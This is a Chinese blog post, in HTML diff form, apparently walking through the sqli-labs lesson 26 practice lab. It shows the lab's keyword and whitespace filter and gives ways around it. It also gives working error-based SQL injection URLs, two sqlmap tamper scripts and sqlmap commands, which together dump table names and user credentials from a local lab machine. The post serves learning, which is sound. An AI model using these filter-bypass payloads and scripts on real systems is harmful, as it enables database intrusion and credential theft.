@@ -1,0 +1,997 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#fff">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="https://fonts.loli.net/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.4.1" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/fish-32x32.png?v=6.4.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/fish-16x16.png?v=6.4.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.1" color="#fff">
+
+
+
+  <meta name="msapplication-config" content="/images/browserconfig.xml">
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.4.1',
+    sidebar: {"position":"right","display":"hide","offset":12,"b2t":false,"scrollpercent":true,"onmobile":true},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="sqli-labs lession 26 GET基于错误-你的空格和注释归我所有 登录界面 分析 1234567891011function blacklist($id)&amp;#123;	$id= preg_replace(&apos;/or/i&apos;,&quot;&quot;, $id);			//strip out OR (non case sensitive)	$id= preg_replace(&apos;/and/i&apos;,&quot;&quot;, $id">
+<meta name="keywords" content="sqli-labs">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-labs lession 26 GET基于错误-你的空格和注释归我所有">
+<meta property="og:url" content="https://yingyingguaier.github.io/2018/10/05/sqli-labs-lession-26-GET基于错误-你的空格和注释归我所有/index.html">
+<meta property="og:site_name" content="0menc&#39;s Blog">
+<meta property="og:description" content="sqli-labs lession 26 GET基于错误-你的空格和注释归我所有 登录界面 分析 1234567891011function blacklist($id)&amp;#123;	$id= preg_replace(&apos;/or/i&apos;,&quot;&quot;, $id);			//strip out OR (non case sensitive)	$id= preg_replace(&apos;/and/i&apos;,&quot;&quot;, $id">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-26/001.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-26/002.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-26/003.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-26/004.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-26/005.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-26/006.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-26/007.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-26/008.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-26/008_1.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-26/008_2.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-26/008_3.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-26/009.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-26/010.png">
+<meta property="og:updated_time" content="2019-06-19T18:51:35.117Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sqli-labs lession 26 GET基于错误-你的空格和注释归我所有">
+<meta name="twitter:description" content="sqli-labs lession 26 GET基于错误-你的空格和注释归我所有 登录界面 分析 1234567891011function blacklist($id)&amp;#123;	$id= preg_replace(&apos;/or/i&apos;,&quot;&quot;, $id);			//strip out OR (non case sensitive)	$id= preg_replace(&apos;/and/i&apos;,&quot;&quot;, $id">
+<meta name="twitter:image" content="https://yingyingguaier.github.io/img/sql/Lesson-26/001.png">
+
+
+
+
+
+
+  <link rel="canonical" href="https://yingyingguaier.github.io/2018/10/05/sqli-labs-lession-26-GET基于错误-你的空格和注释归我所有/">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>sqli-labs lession 26 GET基于错误-你的空格和注释归我所有 | 0menc's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">0menc's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">学习、踩坑及经验分享</p>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-commonweal">
+    <a href="/404.html" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br>Commonweal 404</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://yingyingguaier.github.io/2018/10/05/sqli-labs-lession-26-GET基于错误-你的空格和注释归我所有/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="嘤嘤怪er">
+      <meta itemprop="description" content="0menc">
+      <meta itemprop="image" content="/images/jack.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="0menc's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">sqli-labs lession 26 GET基于错误-你的空格和注释归我所有
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2018-10-05 16:24:20" itemprop="dateCreated datePublished" datetime="2018-10-05T16:24:20+08:00">2018-10-05</time>
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/sql注入/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="sqli-labs-lession-26-GET基于错误-你的空格和注释归我所有"><a href="#sqli-labs-lession-26-GET基于错误-你的空格和注释归我所有" class="headerlink" title="sqli-labs lession 26 GET基于错误-你的空格和注释归我所有"></a>sqli-labs lession 26 GET基于错误-你的空格和注释归我所有</h1><hr>
+<h2 id="登录界面"><a href="#登录界面" class="headerlink" title="登录界面"></a>登录界面</h2><p><img src="/img/sql/Lesson-26/001.png" alt="001"></p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><img src="/img/sql/Lesson-26/002.png" alt="002"></p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function blacklist(<span class="variable">$id</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, <span class="variable">$id</span>);			<span class="regexp">//strip</span> out OR (non <span class="keyword">case</span> sensitive)</span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">'/and/i'</span>,<span class="string">""</span>, <span class="variable">$id</span>);		<span class="regexp">//</span>Strip out AND (non <span class="keyword">case</span> sensitive)</span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);		<span class="regexp">//strip</span> out /*</span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);		<span class="regexp">//</span>Strip out --</span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);			<span class="regexp">//</span>Strip out <span class="comment">#</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">'/[\s]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);		<span class="regexp">//</span>Strip out spaces</span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">'/[\/\\\\]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);		<span class="regexp">//</span>Strip out slashes</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>过滤了 or and / * – # 空格 \</p>
+<p>or and还可以用上一课的方法</p>
+<h3 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a>绕过空格</h3><ol>
+<li>/**/ </li>
+</ol>
+<p>被本课的/*过滤</p>
+<ol start="2">
+<li><code>/**_**/</code></li>
+</ol>
+<p>被本课的/*过滤</p>
+<ol start="3">
+<li>#加一个换行符<code>%23%0A</code>和<code>--</code>加一个换行符<code>--%0A</code></li>
+</ol>
+<p>分别被本课的#过滤和–过滤</p>
+<ol start="4">
+<li>空白符替换</li>
+</ol>
+<p>这里要注意下,我用的Phpstudy搭建的环境,有的成功绕过,有的不行。</p>
+<p>%09 TAB键（水平） </p>
+<p>%0A 新建一行</p>
+<p>%0C 新的一页</p>
+<p>%0D return功能</p>
+<p>%0B TAB键（垂直） （php-5.2.17,5.3.29成功）</p>
+<p>%A0 空格 （php-5.2.17成功）</p>
+<ol start="5">
+<li>用()绕过,意思就是不使用任何空格</li>
+</ol>
+<p>括号可以用来包围子查询，任何计算结果的语句都可以使用<code>()</code>包围</p>
+<h2 id="手注"><a href="#手注" class="headerlink" title="手注"></a>手注</h2><p>知道上述信息就可做了。如果要使用<code>%0B</code>做的话切换版本为php-5.2.17或5.3.29。用()绕过做这几个都行。</p>
+<p>我下面用phpStudy切换版本为php-5.4.45做。</p>
+<h3 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h3><p><code>http://192.168.75.132/sql/Less-26/?id=1&#39;%26%26extractvalue(null,concat(0x7e,database(),0x7e))%7c%7c&#39;1</code></p>
+<p><img src="/img/sql/Lesson-26/003.png" alt="003"></p>
+<h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><p><code>http://192.168.75.132/sql/Less-26/?id=1&#39;%26%26extractvalue(null,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#39;security&#39;)),0x7e))%7c%7c&#39;1</code></p>
+<p><img src="/img/sql/Lesson-26/004.png" alt="004"></p>
+<h3 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h3><p><code>http://192.168.75.132/sql/Less-26/?id=1&#39;%26%26extractvalue(null,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=&#39;users&#39;)),0x7e))%7c%7c&#39;1</code></p>
+<p><img src="/img/sql/Lesson-26/005.png" alt="005"></p>
+<h3 id="获取字段值"><a href="#获取字段值" class="headerlink" title="获取字段值"></a>获取字段值</h3><p>原谅我数据库学的不好,暂时只想到了按id找。</p>
+<p><code>http://192.168.75.132/sql/Less-26/?id=1&#39;%26%26extractvalue(null,concat(0x7e,(select(concat(username,&#39;~&#39;,passwoorrd))from(security.users)where(id=1)),0x7e))%7c%7c&#39;1</code></p>
+<p><img src="/img/sql/Lesson-26/006.png" alt="006"></p>
+<h2 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h2><p>sqlmap跑的话要切换php-5.2.17的版本</p>
+<h3 id="修改脚本"><a href="#修改脚本" class="headerlink" title="修改脚本"></a>修改脚本</h3><p>space2plus.py：空格替换为加号</p>
+<p>在sqlmap的tamper目录下新建space0A.py文件,把space2plus.py脚本中内容复制过来,+改成<code>%A0</code>。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file 'LICENSE' for copying permission</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Replaces space character (' ') with plus ('%A0')</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Notes:</span></span><br><span class="line"><span class="string">        * Is this any useful? The plus get's url-encoded by sqlmap engine invalidating the query afterwards</span></span><br><span class="line"><span class="string">        * This tamper script works against all databases</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper('SELECT id FROM users')</span></span><br><span class="line"><span class="string">    'SELECT%A0id%A0FROM%A0users'</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">""</span></span><br><span class="line">        quote, doublequote, firstspace = <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(payload)):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> firstspace:</span><br><span class="line">                <span class="keyword">if</span> payload[i].isspace():</span><br><span class="line">                    firstspace = <span class="literal">True</span></span><br><span class="line">                    retVal += <span class="string">"%A0"</span></span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">'\''</span>:</span><br><span class="line">                quote = <span class="keyword">not</span> quote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">'"'</span>:</span><br><span class="line">                doublequote = <span class="keyword">not</span> doublequote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">" "</span> <span class="keyword">and</span> <span class="keyword">not</span> doublequote <span class="keyword">and</span> <span class="keyword">not</span> quote:</span><br><span class="line">                retVal += <span class="string">"%A0"</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure>
+
+<h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><p>结合上次双写绕过and和or的andor.py脚本跑一下。</p>
+<p><code>python sqlmap.py -u &quot;http://192.168.75.132/sql/Less-26/?id=1&quot; --threads 10 --technique E --dbms mysql --tamper &quot;space0A.py,andor.py&quot; --fresh-queries --flush-session</code></p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--dbsm msql:指定后端数据库为mysql</span></span><br><span class="line"><span class="comment">--technique E:指定注入方式为报错注入</span></span><br><span class="line"><span class="comment">--threads 10:指定并发线程数为10</span></span><br><span class="line"><span class="comment">--tamper space0A.py,andor.py</span></span><br><span class="line">	andor.py:payload中的<span class="keyword">and</span>用anandd <span class="keyword">or</span>用oorr替代</span><br><span class="line">	space0A.py:空格用%A0替代</span><br><span class="line"><span class="comment">--fresh-queries:发起新请求 </span></span><br><span class="line"><span class="comment">--flush-session：刷新session</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/sql/Lesson-26/007.png" alt="007"></p>
+<p><img src="/img/sql/Lesson-26/008.png" alt="008"></p>
+<p><code>python sqlmap.py -u &quot;http://192.168.75.133/sql/Less-26/?id=1&quot; --threads 10 --technique E --dbms mysql --tamper &quot;andor.py,space0A.py&quot; -D security --tables  --fresh-queries --flush-session</code></p>
+<p><img src="/img/sql/Lesson-26/008_1.png" alt="008_1"></p>
+<p><img src="/img/sql/Lesson-26/008_2.png" alt="008_2"></p>
+<p>跑字段的时候出现了问题,拿不到数据。原来SQLMAP的payload中使用了<code>count(*)</code>包括了<code>*</code>，但是<code>*</code>被过滤了。自然得不出结果。</p>
+<p><img src="/img/sql/Lesson-26/008_3.png" alt="008_3"></p>
+<p>通过查询资料可以发现<code>count(*)</code>和<code>count(常量)</code>是等价的,添加一个把<code>count(*)</code>替换成<code>count(1)</code>的脚本,命名为<code>count.py</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file 'LICENSE' for copying permission</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper('count(*)')</span></span><br><span class="line"><span class="string">    'count(1)'</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = re.sub(<span class="string">r"(?i)count\(\*\)"</span>, <span class="string">r"count(1)"</span>, payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure>
+
+<p>我这里重启了虚拟机ip地址变了,不过不影响实验结果。</p>
+<p><code>python sqlmap.py -u &quot;http://192.168.75.133/sql/Less-26/?id=1&quot; --threads 10 --technique E --dbms mysql --tamper &quot;andor.py,space0A.py,count.py&quot; -D security -T users  --columns --dump --fresh-queries --flush-session</code></p>
+<p><img src="/img/sql/Lesson-26/009.png" alt="009"></p>
+<p><img src="/img/sql/Lesson-26/010.png" alt="010"></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+<div>
+  
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-heart"></i>感谢阅读-------------</div>
+    
+</div>
+  
+</div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/sqli-labs/" rel="tag"># sqli-labs</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/10/06/sqli-labs-lession-26a-GET基于错误-你的空格和注释归我所有-字符型-括号/" rel="prev" title="sqli-labs lession-26a GET基于错误-你的空格和注释归我所有-字符型-括号">
+                <i class="fa fa-chevron-left"></i> sqli-labs lession-26a GET基于错误-你的空格和注释归我所有-字符型-括号
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/10/04/sqli-labs-lession-25a-GET盲注整型单引号-你的OR及AND归我所有/" rel="next" title="sqli-labs lession 25a GET基于盲注整型单引号-你的OR及AND归我所有">
+                sqli-labs lession 25a GET基于盲注整型单引号-你的OR及AND归我所有 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+      <div id="sidebar-dimmer"></div>
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <a href="/">
+                <img class="site-author-image" itemprop="image" src="/images/jack.jpg" alt="嘤嘤怪er">
+              </a>
+            
+              <p class="site-author-name" itemprop="name">嘤嘤怪er</p>
+              <p class="site-description motion-element" itemprop="description">0menc</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">101</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">16</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">17</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
